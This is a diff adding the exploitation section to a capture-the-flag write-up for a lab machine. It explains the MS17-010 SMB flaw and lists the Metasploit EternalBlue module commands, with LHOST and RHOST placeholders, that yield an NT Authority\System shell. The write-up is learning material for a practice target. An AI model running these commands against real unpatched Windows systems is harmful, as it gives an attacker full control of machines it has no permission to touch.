@@ -254,7 +254,79 @@ Lets check the source page of this webpage
 
 ><font color="Green">MS17-010 is a security vulnerability in Microsoft Windows operating systems that was discovered in March 2017. The vulnerability is specifically a flaw in the Microsoft Server Message Block (SMB) protocol, which is used for file sharing and communication between computers on a network.</font>
 
+Lets look for exploits
 
+![image](https://user-images.githubusercontent.com/67879936/223113566-9e9ec85d-20f2-49f7-82bd-0703d2c46e39.png)
+
+cool, we found one. Lets go ahead and exploit this vulnerability.
+
+
+
+<h2>Exploitation</h2>
+
+Link to Exploit:https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/
+
+We'll be using metasploit in this case, I actually tried the manual exploits, I haven't gotten it yet. As soon as I get it I'll post it here. But for now lets use metasploit
+
+>command: msfconsole
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/mr_blue/AutoBlue-MS17-010]
+└─$ msfconsole                                                                            
+                                                  
+  +-------------------------------------------------------+
+  |  METASPLOIT by Rapid7                                 |
+  +---------------------------+---------------------------+
+  |      __________________   |                           |
+  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
+  |             )=\           | |  EXPLOIT   \            |
+  |            // \\          | |_____________\_______    |
+  |           //   \\         | |==[msf >]============\   |
+  |          //     \\        | |______________________\  |
+  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
+  |        //         \\      |  *********************    |
+  +---------------------------+---------------------------+
+  |      o O o                |        \'\/\/\/'/         |
+  |              o O          |         )======(          |
+  |                 o         |       .'  LOOT  '.        |
+  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
+  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
+  | |________________|__|)__| |    |     __||_)     |     |
+  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
+  |  = = = = = = = = = = = =  |     '--------------'      |
+  +---------------------------+---------------------------+
+
+
+       =[ metasploit v6.1.39-dev                          ]
++ -- --=[ 2214 exploits - 1171 auxiliary - 396 post       ]
++ -- --=[ 616 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: When in a module, use back to go 
+back to the top level prompt
+
+msf6 > 
+```
+cool, now we'll be typing these commands in
+
+```
+use exploit/windows/smb/ms17_010_eternalblue
+options
+set LHOST <Your IP>
+set RHOST <Target's IP>
+options
+run
+```
+
+![image](https://user-images.githubusercontent.com/67879936/223118896-d55c7761-22de-4fd2-b5e5-67bff81e6f26.png)
+
+![image](https://user-images.githubusercontent.com/67879936/223119019-6bd73763-c306-4012-b412-849a689360ba.png)
+
+Boom!!! We got a shell as ```nt Authority\System```
+
+That will be all for today
+<br> <br>
+[Back To Home](../../index.md)
 
 
 
